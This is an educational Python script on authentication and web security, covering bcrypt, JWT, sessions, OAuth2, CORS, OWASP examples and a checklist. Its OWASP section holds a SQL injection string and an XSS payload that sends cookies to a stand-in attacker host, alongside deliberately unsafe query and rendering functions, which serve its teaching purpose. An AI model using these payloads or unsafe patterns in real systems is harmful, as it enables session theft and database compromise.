"""
Authentication & Web Application Security.

This is a self-contained, educational script explaining security concepts:
1. Password Hashing (bcrypt)
2. JWT Authentication Workflow (PyJWT)
3. Session-based Authentication Simulation
4. OAuth2 Flow Overview
5. CORS (Cross-Origin Resource Sharing)
6. OWASP Top 10 Vulnerabilities (Unsafe vs. Safe code)
7. Security Best Practices Checklist

To run the runnable parts of this file:
  pip install bcrypt PyJWT
  python authentication_security.py
"""

import os
import time
import html
from typing import Optional

# ==============================================================================
# 1. PASSWORD HASHING (bcrypt)
# ==============================================================================
print("=" * 80)
print("1. PASSWORD HASHING DEMO")
print("=" * 80)

# In modern security, we NEVER store plain-text passwords.
# We run passwords through a one-way cryptographic hashing function with a "salt".
# A salt is random data added to the password input to protect against rainbow table attacks.

try:
    import bcrypt

    def hash_password(password: str) -> str:
        """
        Hashes a plain text password using bcrypt.
        bcrypt automatically handles salting and is designed to be computationally slow.
        """
        # Convert password string to bytes
        password_bytes = password.encode('utf-8')
        # Generate salt (default work factor rounds is 12)
        salt = bcrypt.gensalt()
        # Hash the password bytes
        hashed = bcrypt.hashpw(password_bytes, salt)
        # Return as string for database storage
        return hashed.decode('utf-8')

    def verify_password(plain_password: str, hashed_password: str) -> bool:
        """
        Verifies a plain password against the stored bcrypt hash.
        """
        return bcrypt.checkpw(
            plain_password.encode('utf-8'),
            hashed_password.encode('utf-8')
        )

    # Execution Demo
    user_pass = "SuperSecure123!"
    stored_hash = hash_password(user_pass)
    
    print(f"Plain Password: {user_pass}")
    print(f"Bcrypt Hash:     {stored_hash}")
    print(f"Verify Correct:  {verify_password(user_pass, stored_hash)}")
    print(f"Verify Incorrect: {verify_password('wrongpass', stored_hash)}\n")

except ImportError:
    print("[-] bcrypt module not installed. Run 'pip install bcrypt' to execute password hashing demo.")
    print("Concept: Hashing uses cryptographic algorithms (like bcrypt, Argon2) to turn plain text into irreversible hashes.")
    print("Code Example:")
    print("    hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())\n")


# ==============================================================================
# 2. JWT AUTHENTICATION (PyJWT)
# ==============================================================================
print("=" * 80)
print("2. JWT (JSON WEB TOKEN) DEMO")
print("=" * 80)

# A JWT is a stateless token representing user claims. It is split into three parts:
# Header (Algorithm & Token Type), Payload (Claims, e.g., user_id, exp time), and Signature.
# The server signs the JWT using a secret key. Since it's signed, the server does not
# need to check a database to verify the user identity on every request.

try:
    import jwt

    SECRET_KEY = "my-super-secret-key-that-no-one-can-guess"
    ALGORITHM = "HS256"

    def create_access_token(user_id: int, roles: list) -> str:
        """
        Creates a signed JWT with expiration claims.
        """
        payload = {
            "sub": str(user_id),                  # Subject (User identifier - must be a string)
            "roles": roles,                       # Custom claim
            "exp": int(time.time()) + 60,         # Expiration time (1 minute from now, as integer)
            "iat": int(time.time())               # Issued At time (as integer)
        }
        # Sign token with secret key
        token = jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)
        return token

    def verify_access_token(token: str) -> dict:
        """
        Decodes and verifies the signature and expiration claims of a JWT.
        """
        try:
            # jwt.decode automatically checks the expiration (exp) and signature
            decoded_payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
            return {"status": "valid", "data": decoded_payload}
        except jwt.ExpiredSignatureError:
            return {"status": "invalid", "error": "Token has expired."}
        except jwt.InvalidTokenError:
            return {"status": "invalid", "error": "Invalid Signature / Token."}

    # Execution Demo
    jwt_token = create_access_token(user_id=42, roles=["admin", "student"])
    print(f"Generated JWT: {jwt_token}")
    print(f"Decoded Data:  {verify_access_token(jwt_token)}")
    
    # Test invalid token
    tampered_token = jwt_token[:-4] + "fake"
    print(f"Tampered Token Verification: {verify_access_token(tampered_token)}\n")

except ImportError:
    print("[-] PyJWT module not installed. Run 'pip install PyJWT' to execute JWT demo.")
    print("Concept: JWT is structure Header.Payload.Signature encoded in Base64.")
    print("Code Example:")
    print("    encoded_token = jwt.encode(payload, secret_key, algorithm='HS256')\n")


# ==============================================================================
# 3. SESSION-BASED AUTHENTICATION SIMULATION
# ==============================================================================
print("=" * 80)
print("3. SESSION-BASED AUTHENTICATION SIMULATION")
print("=" * 80)

# Unlike stateless JWTs, Session-based authentication is STATEFUL.
# The server generates a random Session ID, stores it in memory (or database/Redis),
# and sends it to the client inside a cookie. The client sends this cookie back on every request.

class SessionStore:
    def __init__(self):
        # Memory storage mapping SessionID -> UserData
        self._sessions = {}

    def create_session(self, user_data: dict) -> str:
        """Generates a random session ID, stores the data, and returns ID."""
        session_id = os.urandom(16).hex()
        self._sessions[session_id] = {
            "user": user_data,
            "created_at": time.time()
        }
        return session_id

    def get_session(self, session_id: str) -> Optional[dict]:
        """Retrieves user data if session is valid, else None."""
        return self._sessions.get(session_id)

    def destroy_session(self, session_id: str) -> None:
        """Removes the session record (logout)."""
        if session_id in self._sessions:
            del self._sessions[session_id]

# Execution Demo
session_db = SessionStore()
cookie_val = session_db.create_session({"username": "john_doe", "is_premium": True})
print(f"Cookie Sent to Browser (Set-Cookie: session_id={cookie_val})")
print(f"Browser sends cookie back -> Fetch user: {session_db.get_session(cookie_val)}")
session_db.destroy_session(cookie_val)
print(f"After Logout -> Fetch user: {session_db.get_session(cookie_val)}\n")


# ==============================================================================
# 4. OAUTH2 OVERVIEW
# ==============================================================================
"""
OAuth 2.0 is an authorization framework enabling third-party applications to 
obtain limited access to an HTTP service (e.g., 'Log in with Google').

Key Actors in OAuth2:
  1. Resource Owner: The user who owns the account.
  2. Client: The application requesting access (e.g., your website).
  3. Authorization Server: The system validating credentials (e.g., accounts.google.com).
  4. Resource Server: The API exposing user data (e.g., googleapis.com/userinfo).

Standard Flow (Authorization Code Grant):
  Step 1: Client redirects Resource Owner to Authorization Server.
  Step 2: Resource Owner grants permission.
  Step 3: Authorization Server redirects Owner back to Client with an Authorization Code.
  Step 4: Client sends Authorization Code + Client Secret back to Authorization Server.
  Step 5: Authorization Server returns an Access Token.
  Step 6: Client uses Access Token to request data from Resource Server.
"""


# ==============================================================================
# 5. CORS (CROSS-ORIGIN RESOURCE SHARING)
# ==============================================================================
"""
CORS is a browser security mechanism that prevents web page scripts from making 
requests to a different domain than the one that served the web page, unless
the target domain explicitly grants permission.

Preflight Requests (OPTIONS):
When a client script attempts a "non-simple" request (e.g., containing custom headers 
or PUT/DELETE methods) to another domain, the browser automatically sends an 
preflight HTTP 'OPTIONS' request first.

Headers exchanged:
  - Client Request Headers:
      Origin: https://myfrontend.com
      Access-Control-Request-Method: PUT
      
  - Server Response Headers (Permitting request):
      Access-Control-Allow-Origin: https://myfrontend.com (or '*' for public)
      Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
      Access-Control-Allow-Headers: Content-Type, Authorization
"""


# ==============================================================================
# 6. OWASP TOP 10 VULNERABILITIES (UNSAFE VS. SAFE CODE)
# ==============================================================================
print("=" * 80)
print("6. OWASP TOP 10 VULNERABILITIES")
print("=" * 80)

# --- VULNERABILITY A: SQL Injection (SQLi) ---
print("[A] SQL Injection Example")

# Unsafe: Concatenating input directly into SQL strings
def unsafe_get_user(username_input: str) -> str:
    # If username_input is: "admin' OR '1'='1"
    query = f"SELECT * FROM users WHERE username = '{username_input}';"
    return f"Unsafe Query: {query}"

# Safe: Using parameterized queries (prepared statements)
def safe_get_user(username_input: str) -> str:
    # Parameters are sent separately to database driver to prevent input execution as code
    query = "SELECT * FROM users WHERE username = %s;"
    return f"Safe Query:   {query} (with parameter: '{username_input}')"

malicious_input = "admin' OR '1'='1"
print(unsafe_get_user(malicious_input))
print(safe_get_user(malicious_input))
print("-" * 50)


# --- VULNERABILITY B: Cross-Site Scripting (XSS) ---
print("[B] Cross-Site Scripting Example")

# Unsafe: Returning user input raw in HTML responses
def unsafe_render_profile(bio_input: str) -> str:
    # If bio_input contains script tags, it executes in user's browser
    html_page = f"<div><h3>User Bio:</h3><p>{bio_input}</p></div>"
    return html_page

# Safe: Escaping input characters before rendering
def safe_render_profile(bio_input: str) -> str:
    # Converts tags like '<' and '>' to safe HTML entities ('&lt;' and '&gt;')
    escaped_bio = html.escape(bio_input)
    html_page = f"<div><h3>User Bio:</h3><p>{escaped_bio}</p></div>"
    return html_page

malicious_script = "<script>fetch('http://attacker.com/steal-cookie?val=' + document.cookie)</script>"
print(f"Unsafe Output:\n{unsafe_render_profile(malicious_script)}")
print(f"Safe Output:\n{safe_render_profile(malicious_script)}")
print("\n")


# ==============================================================================
# 7. SECURITY BEST PRACTICES CHECKLIST
# ==============================================================================
"""
Web Security Checklist:
  [ ] HTTPS: Always enforce TLS/SSL (HTTPS) in transit to prevent sniffing.
  [ ] Secret Storage: Never commit secret keys, passwords, or tokens to git. Use environment variables.
  [ ] Rate Limiting: Apply rate limit bounds on API routes to avoid brute-forcing.
  [ ] Minimum Privilege: Ensure DB connections only have the permissions necessary to operate.
  [ ] Security Headers: Use HTTP security headers (e.g., Content-Security-Policy, Strict-Transport-Security).
  [ ] Dependencies: Regularly run 'pip audit' or check repository security updates.
  [ ] CSRF Protection: Use anti-CSRF tokens for all state-changing POST/PUT requests.
"""
